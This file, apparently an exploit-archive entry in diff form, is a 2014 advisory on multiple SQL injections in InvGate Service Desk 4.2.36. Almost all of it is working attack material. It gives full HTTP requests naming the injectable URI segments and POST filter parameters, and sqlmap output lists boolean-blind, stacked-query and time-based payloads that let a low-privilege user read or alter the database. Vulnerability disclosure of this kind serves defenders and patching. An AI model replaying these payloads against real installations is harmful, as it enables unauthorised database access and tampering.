@@ -1,0 +1,251 @@
+id: 22430
+date: 07/12/2014
+title: InvGate Service Desk 4.2.36 SQL Injection Vulnerability
+author: Brandon Perry
+cves: 
+
+InvGate Service Desk v4.2.36 multiple vulnerabilities
+http://www.invgate.com/en/service-desk/
+http://www.invgate.com/en/service-desk/on-premise-trial/
+
+Invgate Service Desk suffers from many SQL injections as an authenticated, but non-privileged
+(end-user role) user. Most are also stacked injections, so an attacker also has the ability to
+modify any of the data in the database. The payloads used to determine exploitability are in the
+sqlmap payload output, but each was verified to be able to enumerate the current database,
+current user, and an assortment of other things. These were tested with an ‘end-user’ user.
+
+SQL injection in last URI segment when dismissing breaking news (no data, just a POST) :
+
+POST /breakingnews/manager/dismiss/breakingnew_id/1 HTTP/1.1
+Host: 192.168.1.22
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:26.0) Gecko/20100101 Firefox/26.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Cookie: PHPSESSID=0h1m27t02cr3p2fdhfuh0ubpb2
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+Content-Length: 0
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: URI
+Parameter: #1*
+Type: boolean-based blind
+Title: AND boolean-based blind - WHERE or HAVING clause
+Payload: http://192.168.1.22:80/breakingnews/manager/dismiss/breakingnew_id/1) AND
+6658=6658 AND (5746=5746
+
+Type: stacked queries
+Title: MySQL > 5.0.11 stacked queries
+Payload: http://192.168.1.22:80/breakingnews/manager/dismiss/breakingnew_id/1); SELECT
+SLEEP(5)-- 
+
+Type: AND/OR time-based blind!
+Title: MySQL > 5.0.11 AND time-based blind!
+Payload: http://192.168.1.22:80/breakingnews/manager/dismiss/breakingnew_id/1) AND
+SLEEP(5) AND (9226=9226
+
+
+
+-----------------------
+SQL injection in 5th URI segment when getting the history of an incident:
+
+GET /incident/history/index/incident_id/5/ajax/1 HTTP/1.1
+Host: 192.168.1.22
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:26.0) Gecko/20100101 Firefox/26.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Referer: http://192.168.1.22/incident/show/index/id/5
+Cookie: PHPSESSID=visagd05r0id09eba8nr64p4b2
+Connection: keep-alive
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: URI
+Parameter: #1*
+Type: boolean-based blind
+Title: AND boolean-based blind - WHERE or HAVING clause
+Payload: http://192.168.1.22:80/incident/history/index/incident_id/5) AND 7159=7159 AND
+(1439=1439/ajax/1
+
+Type: stacked queries
+Title: MySQL > 5.0.11 stacked queries
+Payload: http://192.168.1.22:80/incident/history/index/incident_id/5); SELECT SLEEP(5)-- /
+ajax/1
+
+Type: AND/OR time-based blind
+Title: MySQL > 5.0.11 AND time-based blind
+Payload: http://192.168.1.22:80/incident/history/index/incident_id/5) AND SLEEP(5) AND
+(4123=4123/ajax/1
+—
+
+
+-----------------------------------------
+
+SQL injection in two segments when viewing the history of a given incident for a given author
+
+GET /incident/history/index/id/5/author_id/3/incident_id/5/ajax/1 HTTP/1.1
+Host: 192.168.1.22
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:26.0) Gecko/20100101 Firefox/26.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Referer: http://192.168.1.22/incident/show/index/id/5
+Cookie: PHPSESSID=0h1m27t02cr3p2fdhfuh0ubpb2
+Connection: keep-alive
+
+The injections are in the 7th and 9th segments.
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:!
+---
+Place: URI
+Parameter: #2*
+Type: boolean-based blind
+Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+(RLIKE)
+Payload: http://192.168.1.22:80/incident/history/index/id/5/author_id/3/incident_id/5) RLIKE
+(SELECT (CASE WHEN (5283=5283) THEN 5 ELSE 0x28 END)) AND (9940=9940/ajax/1
+
+Type: stacked queries
+Title: MySQL > 5.0.11 stacked queries
+Payload: http://192.168.1.22:80/incident/history/index/id/5/author_id/3/incident_id/5); SELECT
+SLEEP(5)-- /ajax/1
+
+Type: AND/OR time-based blind
+Title: MySQL > 5.0.11 AND time-based blind
+Payload: http://192.168.1.22:80/incident/history/index/id/5/author_id/3/incident_id/5) AND
+SLEEP(5) AND (2858=2858/ajax/1
+
+Place: URI
+Parameter: #1*
+Type: boolean-based blind
+Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+(RLIKE)!
+Payload: http://192.168.1.22:80/incident/history/index/id/5/author_id/3) RLIKE (SELECT
+(CASE WHEN (1161=1161) THEN 3 ELSE 0x28 END)) AND (3766=3766/incident_id/5/ajax/1
+
+Type: stacked queries
+Title: MySQL > 5.0.11 stacked queries
+Payload: http://192.168.1.22:80/incident/history/index/id/5/author_id/3); SELECT SLEEP(5)-- /
+incident_id/5/ajax/1
+
+Type: AND/OR time-based blind!
+Title: MySQL > 5.0.11 AND time-based blind
+Payload: http://192.168.1.22:80/incident/history/index/id/5/author_id/3) AND SLEEP(5) AND
+(6225=6225/incident_id/5/
+
+
+--------------------------------------
+
+SQL injection vectors within the request to search for your current open requests:
+
+POST /incident/list/list/default_filter/5 HTTP/1.1
+Host: 192.168.1.22
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:26.0) Gecko/20100101 Firefox/26.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://192.168.1.22/incident/list/index/default_filter/5
+Content-Length: 674
+Cookie: PHPSESSID=visagd05r0id09eba8nr64p4b2
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+post_filter%5Blikes%5D%5Bincidents.title%5D=&post_filter%5Blikes%5D%5Bassigneds.name
+%5D=&post_filter%5Blikes%5D%5Bassigneds.lastname%5D=&post_filter%5Blikes%5D
+%5Bcustomers.name%5D=&post_filter%5Blikes%5D%5Bcustomers.lastname%5D=&post_filter
+%5Blikes%5D%5Bincidents.id%5D=&showGroupTab=&post_filter%5Bor_conditions%5D
+%5B0%5D%5Bincidents.priority_id%5D%5B%5D=1&post_filter%5Bor_conditions%5D
+%5B1%5D%5Bincidents.status_id%5D%5B%5D=1&post_filter%5Bor_conditions%5D
+%5B2%5D%5Bincidents.source_id%5D%5B%5D=1&post_filter%5Border%5D%5B1%5D
+%5Bcol%5D=incidents.priority_id&post_filter%5Border%5D%5B1%5D%5Bval
+%5D=DESC&post_filter%5Bor_conditions%5D%5B3%5D%5Bincidents.type_id%5D%5B
+%5D=1
+
+Within the post_filter[or_conditions] parameters, both the incidents.*_id key and the value are
+susceptible to SQL injections. Not all of these are needed for a successful request, but this is
+what the request looks like coming from the browser. An asterisk (*) was used to test the key
+and value.
+
+sqlmap identified the following injection points with a total of 803 HTTP(s) requests:
+---
+Place: (custom) POST
+Parameter: #2*
+Type: boolean-based blind
+Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)!
+Payload: post_filter[likes][incidents.title]=&post_filter[likes]
+[assigneds.name]=&post_filter[likes][assigneds.lastname]=&post_filter[likes]
+[customers.name]=&post_filter[likes][customers.lastname]=&post_filter[likes]
+[incidents.id]=&showGroupTab=&post_filter[or_conditions][0][incidents.priority_id]
+[]=1&post_filter[or_conditions][1][incidents.status_id][]=-5375)) OR
+(4196=4196)#&post_filter[or_conditions][2][incidents.source_id][]=1&post_filter[order][1]
+[col]=incidents.priority_id&post_filter[order][1][val]=DESC&post_filter[or_conditions][3]
+[incidents.type_id][]=1
+
+Type: stacked queries
+Title: MySQL > 5.0.11 stacked queries!
+Payload: post_filter[likes][incidents.title]=&post_filter[likes]
+[assigneds.name]=&post_filter[likes][assigneds.lastname]=&post_filter[likes]
+[customers.name]=&post_filter[likes][customers.lastname]=&post_filter[likes]
+[incidents.id]=&showGroupTab=&post_filter[or_conditions][0][incidents.priority_id]
+[]=1&post_filter[or_conditions][1][incidents.status_id][]=1)); SELECT SLEEP(5)--
+&post_filter[or_conditions][2][incidents.source_id][]=1&post_filter[order][1]
+[col]=incidents.priority_id&post_filter[order][1][val]=DESC&post_filter[or_conditions][3]
+[incidents.type_id][]=1
+
+Type: AND/OR time-based blind!
+Title: MySQL < 5.0.12 AND time-based blind (heavy query)
+Payload: post_filter[likes][incidents.title]=&post_filter[likes]
+[assigneds.name]=&post_filter[likes][assigneds.lastname]=&post_filter[likes]
+[customers.name]=&post_filter[likes][customers.lastname]=&post_filter[likes]
+[incidents.id]=&showGroupTab=&post_filter[or_conditions][0][incidents.priority_id]
+[]=1&post_filter[or_conditions][1][incidents.status_id][]=1)) AND
+7038=BENCHMARK(5000000,MD5(0x4f7a6550)) AND ((5798=5798&post_filter[or_conditions]
+[2][incidents.source_id][]=1&post_filter[order][1][col]=incidents.priority_id&post_filter[order][1]
+[val]=DESC&post_filter[or_conditions][3][incidents.type_id][]=1
+
+Place: (custom) POST
+Parameter: #1*
+Type: boolean-based blind
+Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+Payload: post_filter[likes][incidents.title]=&post_filter[likes]
+[assigneds.name]=&post_filter[likes][assigneds.lastname]=&post_filter[likes]
+[customers.name]=&post_filter[likes][customers.lastname]=&post_filter[likes]
+[incidents.id]=&showGroupTab=&post_filter[or_conditions][0][incidents.priority_id]
+[]=1&post_filter[or_conditions][1][incidents.status_id-9395) OR (3084=3084)#]
+[]=1&post_filter[or_conditions][2][incidents.source_id][]=1&post_filter[order][1]
+[col]=incidents.priority_id&post_filter[order][1][val]=DESC&post_filter[or_conditions][3]
+[incidents.type_id][]=1
+
+Type: stacked queries
+Title: MySQL > 5.0.11 stacked queries
+Payload: post_filter[likes][incidents.title]=&post_filter[likes]
+[assigneds.name]=&post_filter[likes][assigneds.lastname]=&post_filter[likes]
+[customers.name]=&post_filter[likes][customers.lastname]=&post_filter[likes]
+[incidents.id]=&showGroupTab=&post_filter[or_conditions][0][incidents.priority_id]
+[]=1&post_filter[or_conditions][1][incidents.status_id); SELECT SLEEP(5)-- ]
+[]=1&post_filter[or_conditions][2][incidents.source_id][]=1&post_filter[order][1]
+[col]=incidents.priority_id&post_filter[order][1][val]=DESC&post_filter[or_conditions][3]
+[incidents.type_id][]=1
+
+Type: AND/OR time-based blind
+Title: MySQL < 5.0.12 AND time-based blind (heavy query - comment)
+Payload: post_filter[likes][incidents.title]=&post_filter[likes]
+[assigneds.name]=&post_filter[likes][assigneds.lastname]=&post_filter[likes]
+[customers.name]=&post_filter[likes][customers.lastname]=&post_filter[likes]
+[incidents.id]=&showGroupTab=&post_filter[or_conditions][0][incidents.priority_id]
+[]=1&post_filter[or_conditions][1][incidents.status_id) AND
+3932=BENCHMARK(5000000,MD5(0x68494a54))#][]=1&post_filter[or_conditions][2]
+[incidents.source_id][]=1&post_filter[order][1][col]=incidents.priority_id&post_filter[order][1]
+[val]=DESC&post_filter[or_conditions][3][incidents.type_id][]=1
+
+#  0day.today [2023-03-25]  #
